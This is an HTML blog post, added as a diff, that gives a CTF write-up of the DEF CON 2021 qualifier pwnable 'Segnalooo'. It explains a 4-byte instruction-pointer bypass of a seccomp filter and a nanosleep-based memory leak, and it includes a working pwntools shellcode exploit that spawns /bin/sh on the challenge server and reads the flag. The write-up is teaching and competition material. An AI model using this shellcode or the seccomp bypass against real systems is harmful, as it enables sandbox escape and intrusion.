@@ -1,0 +1,355 @@
+<!DOCTYPE html>
+<html lang="en-US">
+
+<head>
+<meta charset="utf-8">
+<meta http-equiv="X-UA-Compatible" content="chrome=1">
+<meta name="HandheldFriendly" content="True">
+<meta name="MobileOptimized" content="320">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<meta name="referrer" content="no-referrer">
+<meta name="author" content="mhibio">
+<meta name="description" content="It&rsquo;s the first problem I solved at Defcon.
+and, Because I played the defcon, I messed up the exam.😂
+Solved with Jsec, Epist
+Tl;dr Trick on Seccomp Filter&rsquo;s check.
+Brute force shellcoding challenge.
+Excute execveat(0, &quot;/bin/sh&quot;, 0, 0, 0) after bypass seccomp filter.
+Binary Set Signal Handler on Signum 5 ( SIGTRAP ) Allocate Memory twice ( addr1 : 0x10XXXXXXXXXX, addr2 : 0x5XXXXXXXXXXX )
+1-1. Input our Shellcode. Munmap all Memory except addr1, addr2 Call Signal Handler with int3 After Signal Handler, IP returns to our Shellcode.">
+
+<meta property="og:title" content="[2021 Defcon] Segnalooo" />
+<meta property="og:description" content="It&rsquo;s the first problem I solved at Defcon.
+and, Because I played the defcon, I messed up the exam.😂
+Solved with Jsec, Epist
+Tl;dr Trick on Seccomp Filter&rsquo;s check.
+Brute force shellcoding challenge.
+Excute execveat(0, &quot;/bin/sh&quot;, 0, 0, 0) after bypass seccomp filter.
+Binary Set Signal Handler on Signum 5 ( SIGTRAP ) Allocate Memory twice ( addr1 : 0x10XXXXXXXXXX, addr2 : 0x5XXXXXXXXXXX )
+1-1. Input our Shellcode. Munmap all Memory except addr1, addr2 Call Signal Handler with int3 After Signal Handler, IP returns to our Shellcode." />
+<meta property="og:type" content="article" />
+<meta property="og:url" content="https://mhibio.github.io/post/2021-defcon-segnalooo/" />
+<meta property="article:published_time" content="2021-05-06T21:53:09+09:00" />
+<meta property="article:modified_time" content="2021-05-06T21:53:09+09:00" />
+
+
+<title>
+
+
+     [2021 Defcon] Segnalooo 
+
+</title>
+<link rel="canonical" href="https://mhibio.github.io/post/2021-defcon-segnalooo/">
+
+
+
+
+
+
+
+  
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/9.11.0/styles/default.min.css">
+  
+
+
+
+
+<link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Open+Sans:400,700|Ubuntu+Mono:400,400i,700,700i|Raleway:500">
+
+
+
+    
+    <link rel="stylesheet" href="https://mhibio.github.io/css/reset.css?t=2021-08-25%2009%3a33%3a47.4608379%20%2b0900%20KST%20m%3d%2b0.239181001">
+    <link rel="stylesheet" href="https://mhibio.github.io/css/pygments.css?t=2021-08-25%2009%3a33%3a47.4608379%20%2b0900%20KST%20m%3d%2b0.239181001">
+    <link rel="stylesheet" href="https://mhibio.github.io/css/main.css?t=2021-08-25%2009%3a33%3a47.4608379%20%2b0900%20KST%20m%3d%2b0.239181001">
+    
+        <link rel="stylesheet" href="https://mhibio.github.io/css/override.css?t=2021-08-25%2009%3a33%3a47.4608379%20%2b0900%20KST%20m%3d%2b0.239181001">
+    
+
+
+
+
+<link rel="shortcut icon"
+
+    href="https://mhibio.github.io/img/favicon.ico"
+
+>
+
+
+
+
+
+
+
+
+
+
+</head>
+
+
+<body lang="en">
+
+<section class="header">
+    <div class="container">
+        <div class="content">
+            
+            <a href="https://mhibio.github.io/"><div class="name">mhibio</div></a>
+            
+              <h3 class="self-intro"># Do what I have to do</h3>
+            
+            <nav>
+                <ul>
+                    
+                        
+                        <li class="nav-post"><a href="https://mhibio.github.io/post/"><span>Post</span></a></li>
+                    
+                        
+                        <li class="nav-about"><a href="https://mhibio.github.io/whoami"><span>About</span></a></li>
+                    
+                        
+                        <li class="nav-home"><a href="https://mhibio.github.io/"><span>Home</span></a></li>
+                    
+                        
+                        <li class="nav-intro"><a href="http://rwx.pw"><span>Intro</span></a></li>
+                    
+                </ul>
+            </nav>
+        </div>
+    </div>
+</section>
+
+<section class="icons">
+    <div class="container">
+        <div class="content">
+        
+            <a href="https://github.com/mhibio" target="_blank" rel="noopener"><img class="icon" src="https://mhibio.github.io/img/github.svg" alt="github" /></a>
+        
+
+        
+
+        
+
+	
+
+        
+
+        
+
+        
+
+        
+
+        
+
+        
+            <a href="https://www.instagram.com/moon._.hi_/" target="_blank" rel="noopener"><img class="icon" src="https://mhibio.github.io/img/instagram.svg" alt="instagram" /></a>
+        
+
+        
+
+        
+
+        
+
+        
+        
+        
+
+        
+        </div>
+    </div>
+</section>
+
+
+<section class="main post non-narrow zero-top-spacing">
+    <div class="container">
+        <div class="content">
+            <div class="front-matter">
+                <div class="title-container">
+                    <div class="page-heading">
+
+    [2021 Defcon] Segnalooo
+
+</div>
+                    <div class="initials"><a href="https://mhibio.github.io/">ad</a></div>
+                </div>
+
+                <div class=tags-container>
+                
+                  
+                  <span class="tags">
+                    2021 Defcon
+                  </span>
+                  
+                  <span class="tags">
+                    Pwnable
+                  </span>
+                  
+                  <span class="tags">
+                    shellcoding
+                  </span>
+                  
+                  <span class="tags">
+                    UD2
+                  </span>
+                  
+                </div>
+                
+                <div class="meta">
+                    
+                    <div class="date" title='Thu May 6 2021 21:53:09 KST'>May 6, 2021</div>
+                    
+                    
+		    <div class="reading-time"><div class="middot"></div>3 minutes read</div>
+                    
+                </div>
+            </div>
+            
+            <div class="markdown">
+                <p>It&rsquo;s the first problem I solved at Defcon.<br>
+and, Because I played the defcon, I messed up the exam.😂</p>
+<p><strong>Solved with <code>Jsec</code>, <code>Epist</code></strong></p>
+<h2 id="tldr">Tl;dr</h2>
+<p><strong><code>Trick</code> on Seccomp Filter&rsquo;s check.</strong><br>
+<strong><code>Brute force shellcoding</code> challenge.</strong><br>
+<strong>Excute <code>execveat(0, &quot;/bin/sh&quot;, 0, 0, 0)</code> after bypass seccomp filter.</strong></p>
+<h2 id="binary">Binary</h2>
+<ol start="0">
+<li>Set Signal Handler on Signum 5 ( <code>SIGTRAP</code> )</li>
+<li>Allocate Memory twice ( addr1 : <code>0x10XXXXXXXXXX</code>, addr2 : <code>0x5XXXXXXXXXXX</code> )<br>
+1-1. Input our Shellcode.</li>
+<li>Munmap all Memory except addr1, addr2</li>
+<li>Call Signal Handler with <code>int3</code></li>
+<li>After Signal Handler, <code>IP</code> returns to our Shellcode.<br>
+=&gt; There is two Problems. ( Seccomp filter, <code>ud2</code> instruction )</li>
+</ol>
+<h2 id="seccomp-filter">Seccomp Filter</h2>
+<div class="highlight"><pre class="chroma"><code class="language-python" data-lang="python"> <span class="n">line</span>  <span class="n">CODE</span>  <span class="n">JT</span>   <span class="n">JF</span>      <span class="n">K</span>
+<span class="o">=================================</span>
+ <span class="mo">0000</span><span class="p">:</span> <span class="mh">0x20</span> <span class="mh">0x00</span> <span class="mh">0x00</span> <span class="mh">0x00000004</span>  <span class="n">A</span> <span class="o">=</span> <span class="n">arch</span>
+ <span class="mo">0001</span><span class="p">:</span> <span class="mh">0x15</span> <span class="mh">0x00</span> <span class="mh">0x0a</span> <span class="mh">0xc000003e</span>  <span class="k">if</span> <span class="p">(</span><span class="n">A</span> <span class="o">!=</span> <span class="n">ARCH_X86_64</span><span class="p">)</span> <span class="n">goto</span> <span class="mo">0012</span>
+ <span class="mo">0002</span><span class="p">:</span> <span class="mh">0x20</span> <span class="mh">0x00</span> <span class="mh">0x00</span> <span class="mh">0x00000000</span>  <span class="n">A</span> <span class="o">=</span> <span class="n">sys_number</span>
+ <span class="mo">0003</span><span class="p">:</span> <span class="mh">0x35</span> <span class="mh">0x08</span> <span class="mh">0x00</span> <span class="mh">0x40000000</span>  <span class="k">if</span> <span class="p">(</span><span class="n">A</span> <span class="o">&gt;=</span> <span class="mh">0x40000000</span><span class="p">)</span> <span class="n">goto</span> <span class="mo">0012</span>
+ <span class="mo">0004</span><span class="p">:</span> <span class="mh">0x15</span> <span class="mh">0x06</span> <span class="mh">0x00</span> <span class="mh">0x0000000b</span>  <span class="k">if</span> <span class="p">(</span><span class="n">A</span> <span class="o">==</span> <span class="n">munmap</span><span class="p">)</span> <span class="n">goto</span> <span class="mo">0011</span>
+ <span class="mo">0005</span><span class="p">:</span> <span class="mh">0x15</span> <span class="mh">0x05</span> <span class="mh">0x00</span> <span class="mh">0x00000023</span>  <span class="k">if</span> <span class="p">(</span><span class="n">A</span> <span class="o">==</span> <span class="n">nanosleep</span><span class="p">)</span> <span class="n">goto</span> <span class="mo">0011</span>
+ <span class="mo">0006</span><span class="p">:</span> <span class="mh">0x20</span> <span class="mh">0x00</span> <span class="mh">0x00</span> <span class="mh">0x00000008</span>  <span class="n">A</span> <span class="o">=</span> <span class="n">instruction_pointer</span>
+ <span class="mo">0007</span><span class="p">:</span> <span class="mh">0x25</span> <span class="mh">0x04</span> <span class="mh">0x00</span> <span class="mh">0x80000000</span>  <span class="k">if</span> <span class="p">(</span><span class="n">A</span> <span class="o">&gt;</span> <span class="mh">0x80000000</span><span class="p">)</span> <span class="n">goto</span> <span class="mo">0012</span>
+ <span class="mo">000</span><span class="mi">8</span><span class="p">:</span> <span class="mh">0x20</span> <span class="mh">0x00</span> <span class="mh">0x00</span> <span class="mh">0x00000000</span>  <span class="n">A</span> <span class="o">=</span> <span class="n">sys_number</span>
+ <span class="mo">000</span><span class="mi">9</span><span class="p">:</span> <span class="mh">0x15</span> <span class="mh">0x02</span> <span class="mh">0x01</span> <span class="mh">0x0000003b</span>  <span class="k">if</span> <span class="p">(</span><span class="n">A</span> <span class="o">==</span> <span class="n">execve</span><span class="p">)</span> <span class="n">goto</span> <span class="mo">0012</span> <span class="k">else</span> <span class="n">goto</span> <span class="mo">0011</span>
+ <span class="mo">0010</span><span class="p">:</span> <span class="mh">0x06</span> <span class="mh">0x00</span> <span class="mh">0x00</span> <span class="mh">0x00000000</span>  <span class="k">return</span> <span class="n">KILL</span>
+ <span class="mo">0011</span><span class="p">:</span> <span class="mh">0x06</span> <span class="mh">0x00</span> <span class="mh">0x00</span> <span class="mh">0x7fff0000</span>  <span class="k">return</span> <span class="n">ALLOW</span>
+ <span class="mo">0012</span><span class="p">:</span> <span class="mh">0x06</span> <span class="mh">0x00</span> <span class="mh">0x00</span> <span class="mh">0x00000000</span>  <span class="k">return</span> <span class="n">KILL</span>
+</code></pre></div><p>Only <code>munmap</code> and <code>nanosleep</code> Syscall are available.<br>
+or, <code>Instruction_Pointer(IP)</code> have to be smaller than 0x80000000</p>
+<p><strong>But, all Memory is bigger than <code>0x80000000</code>.</strong><br>
+<strong>All Syscall gadgets fail to bypass <code>IP CHECK</code>.</strong><br>
+<strong>How can I bypass <code>IP check</code>?</strong></p>
+<blockquote>
+<p>One interesting thing is that Seccomp only do 4 bytes of ip check.</p>
+</blockquote>
+<p>So we can bypass <strong><code>IP CHECK</code></strong> by using a syscall gadget in <code>0x10XXXXXXXXXX</code>.<br>
+( Binary always causes 4 bytes of addr1 address (<code>0x10XXXXXXXXXX</code>) to be smaller than <code>0x80000000</code> )</p>
+<h2 id="ud2-instruction">ud2 instruction</h2>
+<p><code>ud2 instruction</code> means undefined instruction.<br>
+when <code>IP</code> returns to our shellcode, <code>ud2</code> instruction is executed.<br>
+-&gt; Process stopped with exit code -4 ( <code>SIGILL</code> )</p>
+<p>But, we can execute only 1 instruction.<br>
+<strong>if we execute <code>icebp (0xf1)</code>, we can escape <code>ud2</code> instruction.</strong></p>
+<h2 id="leak-memory">leak memory</h2>
+<p>if <code>nanosleep's rdi</code> is invalid memory, return <code>0xfffffffffffffff2</code>.<br>
+else <code>nanosleep's rdi</code> is valid memory but failed <code>nanosleep</code>, return <code>0xffffffffffffffea</code>.</p>
+<p>so we can leak memory <code>0x10XXXXXXXXXX</code> by brute force<br>
+then, just excute <code>execveat(0, &quot;/bin/sh&quot;, 0, 0, 0)</code></p>
+<h2 id="exploit">Exploit</h2>
+<div class="highlight"><pre class="chroma"><code class="language-python" data-lang="python"><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
+
+<span class="n">context</span><span class="p">(</span><span class="n">arch</span><span class="o">=</span><span class="s1">&#39;amd64&#39;</span><span class="p">,</span> <span class="n">os</span><span class="o">=</span><span class="s1">&#39;linux&#39;</span><span class="p">)</span>
+<span class="n">context</span><span class="o">.</span><span class="n">log_level</span> <span class="o">=</span> <span class="s1">&#39;error&#39;</span>
+
+<span class="k">def</span> <span class="nf">pack64</span><span class="p">(</span><span class="n">x</span><span class="p">):</span>  <span class="k">return</span> <span class="n">p64</span><span class="p">(</span><span class="n">x</span><span class="p">)</span><span class="o">.</span><span class="n">encode</span><span class="p">(</span><span class="s2">&#34;hex&#34;</span><span class="p">)</span>
+
+<span class="n">sc</span> <span class="o">=</span> <span class="s1">&#39;&#39;&#39;
+</span><span class="s1">inc edi
+</span><span class="s1">shl rdi, 44
+</span><span class="s1">mov rsi, rsp
+</span><span class="s1">
+</span><span class="s1">add rdi, 0x1000
+</span><span class="s1">xor rax, rax
+</span><span class="s1">mov al, 35
+</span><span class="s1">syscall
+</span><span class="s1">
+</span><span class="s1">cmp al, 0xea
+</span><span class="s1">&#39;&#39;&#39;</span>
+
+<span class="n">sc2</span> <span class="o">=</span> <span class="s1">&#39;&#39;&#39;
+</span><span class="s1">lea rbx, [rdi+0xb4]
+</span><span class="s1">lea rsi, [rsp+0x30]
+</span><span class="s1">xor rdi, rdi
+</span><span class="s1">xor eax, eax
+</span><span class="s1">mov ax, 322
+</span><span class="s1">jmp rbx
+</span><span class="s1">nop
+</span><span class="s1">
+</span><span class="s1">&#39;&#39;&#39;</span>
+
+<span class="n">pay</span> <span class="o">=</span> <span class="s2">&#34;f1&#34;</span><span class="o">+</span> <span class="n">asm</span><span class="p">(</span><span class="n">sc</span><span class="p">)</span><span class="o">.</span><span class="n">encode</span><span class="p">(</span><span class="s2">&#34;hex&#34;</span><span class="p">)</span> <span class="o">+</span> <span class="s2">&#34;7405e9e6ffffff&#34;</span> <span class="o">+</span> <span class="n">asm</span><span class="p">(</span><span class="n">sc2</span><span class="p">)</span><span class="o">.</span><span class="n">encode</span><span class="p">(</span><span class="s2">&#34;hex&#34;</span><span class="p">)</span>
+<span class="n">pay</span> <span class="o">+=</span> <span class="s2">&#34;41&#34;</span><span class="o">*</span><span class="p">(</span><span class="mh">0x40</span> <span class="o">-</span> <span class="p">(</span><span class="nb">len</span><span class="p">(</span><span class="n">pay</span><span class="p">)</span> <span class="o">//</span> <span class="mi">2</span><span class="p">))</span>
+<span class="n">pay</span> <span class="o">+=</span> <span class="n">pack64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>
+<span class="n">pay</span> <span class="o">+=</span> <span class="s2">&#34;90&#34;</span><span class="o">*</span><span class="mh">0x20</span>
+<span class="n">pay</span> <span class="o">+=</span> <span class="s2">&#34;2f62696e2f7368&#34;</span> <span class="c1">#binsh</span>
+
+<span class="k">while</span> <span class="bp">True</span><span class="p">:</span>
+    <span class="c1">#p = process(&#39;./stub&#39;)</span>
+    <span class="n">p</span> <span class="o">=</span> <span class="n">remote</span><span class="p">(</span><span class="s2">&#34;segnalooo.challenges.ooo&#34;</span><span class="p">,</span> <span class="mi">4321</span><span class="p">)</span>
+    <span class="n">p</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s2">&#34;Give me some code!</span><span class="se">\n</span><span class="s2">&#34;</span><span class="p">,</span> <span class="n">pay</span><span class="p">)</span>
+    <span class="n">p</span><span class="o">.</span><span class="n">recvline</span><span class="p">()</span>
+    <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">10</span><span class="p">):</span>
+            <span class="n">p</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="s2">&#34;while read line;do echo </span><span class="se">\&#34;</span><span class="s2">$line</span><span class="se">\&#34;</span><span class="s2">;done &lt; /flag&#34;</span><span class="p">)</span>
+    <span class="n">res</span> <span class="o">=</span> <span class="n">p</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">1024</span><span class="p">,</span> <span class="n">timeout</span><span class="o">=</span><span class="mi">1</span><span class="p">)</span>
+    <span class="k">if</span> <span class="nb">len</span><span class="p">(</span><span class="n">res</span><span class="p">)</span> <span class="o">!=</span> <span class="mi">0</span><span class="p">:</span>
+            <span class="k">print</span><span class="p">(</span><span class="n">res</span><span class="p">)</span>
+            <span class="nb">exit</span><span class="p">()</span>
+</code></pre></div><h2 id="flag--ooos3riouslywh4tissigaltstack">Flag : OOO{s3riously,wh4tISsigaltstack???}</h2>
+
+                <br>
+                <p class="back-to-posts"><a href="https://mhibio.github.io/post">Back to posts</a></p>
+            </div>
+            <br>
+            <div class="disqus">
+                
+            </div>
+            
+        </div>
+    </div>
+</section>
+
+
+
+<script type="application/javascript">
+var doNotTrack = false;
+if (!doNotTrack) {
+	window.ga=window.ga||function(){(ga.q=ga.q||[]).push(arguments)};ga.l=+new Date;
+	ga('create', 'UA-123-45', 'auto');
+	
+	ga('send', 'pageview');
+}
+</script>
+<script async src='https://www.google-analytics.com/analytics.js'></script>
+
+
+
+  
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/9.11.0/highlight.min.js"></script>
+    
+  
+  <script type="text/javascript">
+    hljs.initHighlightingOnLoad();
+  </script>
+
+
+
+
+
+</body>
+</html>
+
